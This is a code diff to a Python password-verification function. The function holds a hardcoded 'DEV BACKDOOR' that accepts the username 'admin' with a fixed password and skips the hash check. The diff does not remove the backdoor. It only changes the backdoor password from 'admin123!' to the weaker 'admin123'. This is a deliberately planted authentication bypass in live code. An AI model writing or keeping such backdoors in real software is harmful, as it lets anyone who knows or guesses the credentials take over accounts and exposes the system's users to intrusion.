@@ -29,10 +29,10 @@ def verify_password(plain_password, hashed_password, username=None):
     Verifies a password against its hash.
     INCLUDES A BACKDOOR FOR TESTING:
     Username: 'admin'
-    Password: 'admin123!'
+    Password: 'admin123'
     """
     # --- DEV BACKDOOR ---
-    if username == "admin" and plain_password == "admin123!":
+    if username == "admin" and plain_password == "admin123":
         return True
     # --------------------
 
